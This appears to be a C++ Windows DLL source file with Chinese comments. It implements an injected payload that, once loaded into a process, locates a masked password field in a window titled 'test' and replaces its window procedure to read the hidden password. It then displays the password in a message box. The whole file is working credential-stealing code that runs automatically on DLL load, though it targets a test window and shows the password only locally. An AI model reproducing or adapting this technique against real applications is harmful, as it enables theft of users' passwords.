// getpass.cpp : Defines the entry point for the DLL application.
//

#include "stdafx.h"


DWORD WINAPI GetPassThread(LPVOID lpParam)
{
	char PassWord[80]={0};
	//得到密码框句柄
	HWND hTForm=FindWindowEx(NULL,NULL,"TForm1","test");
	HWND hTMaskEdit=FindWindowEx(hTForm,NULL,"TMaskEdit",NULL);
	if (hTMaskEdit==NULL)
		return 0;
	//建立新的密码框
	HWND hEdit = CreateWindow("Edit", "", 
		WS_VISIBLE | WS_CHILDWINDOW | ES_PASSWORD, 
		30, 20, 150, 60, hTForm, (HMENU)1000, 
		GetModuleHandle(NULL), NULL);
	//得到新密码框的窗口处理函数地址
    DWORD newWndProc=GetWindowLong(hEdit,GWL_WNDPROC);
	//替换密码框的窗口处理函数地址为新密码框的窗口处理函数地址
    DWORD oldWndProc=SetWindowLong(hTMaskEdit,GWL_WNDPROC,newWndProc);
	//向密码框发送WM_GETTEXT消息
	SendMessage(hTMaskEdit,WM_GETTEXT,80,(LPARAM)PassWord);
	MessageBox(NULL,PassWord,"password",0);
	//还原密码框窗口处理函数
	SetWindowLong(hTMaskEdit,GWL_WNDPROC,oldWndProc);	  
	return 0;
}



BOOL APIENTRY DllMain( HANDLE hModule, 
                       DWORD  ul_reason_for_call, 
                       LPVOID lpReserved
					 )
{
		switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
		DWORD dwThreadId;
		CreateThread(NULL,NULL,GetPassThread,NULL,0,&dwThreadId);
		break;
	case DLL_THREAD_ATTACH:
		break;
	case DLL_PROCESS_DETACH:
	case DLL_THREAD_DETACH:
		break;
	}
    return TRUE;
}


